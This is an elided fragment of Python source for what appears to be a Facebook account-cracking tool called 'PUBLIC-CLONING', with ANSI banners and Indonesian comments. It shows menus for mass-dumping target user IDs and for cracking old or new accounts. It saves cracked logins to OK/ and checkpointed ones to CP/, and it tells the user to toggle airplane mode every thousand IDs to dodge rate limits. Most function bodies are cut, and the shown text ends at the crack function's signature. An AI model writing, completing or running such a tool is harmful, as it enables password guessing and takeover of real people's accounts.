...
\x1b[1;93m ║𒁍[✔] TOOLS     :      PUBLIC-CLONING    ║
\x1b[1;92m ║𒁍[✔] VERSION   :      1.0.0             ║
\x1b[1;91m ╚════════════════════════════════════════╝

 \x1b[1;94m Assalamu-Alaikum ''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	print('├──> 3. Report Tool ')
	print('├──> 4. Crack Results  ')
	print('├──> 0. Logout cookies        ')
	print('|')
	_____YT__Ibnz_____ = input('\r├──> Choose : ')
	if _____YT__Ibnz_____ in ['1']:
		...
		back()
def error():
	jalan(f'{sir}├──> wait you will be directed to Facebook  {x}')
	time.sleep(4)
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('├──> How many IDs do you want to add ? : '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('├──> Enter the Facebook Uid '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}├──> 1. Crack Old Idz ')
	print('├──> 2. Crack New Idz ')
	print('├──> 3. Random ')
	print('|')
	hu = input('├──> Choose : ')
	if hu in ['1','01']:
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('|')
	_jembot_ = input('├──> See the app to add to the ID ( Y/t ) ')
	if _jembot_ in ['']:
...
def passwrd():
	...
	print('|')
	print(f'├──> {h}OK{x} Idz Result Saved In : {h}OK/%s {x}'%(okc))
	print(f'├──> {k}CP{x} Idz Result Saved In : {k}CP/%s {x}'%(cpc))
	print(f'├──> Turn on Airplane mode 5 seconds {m}1k{x} Idz\r')
	print('|')
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}├──>{k} Good Bye Brother{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
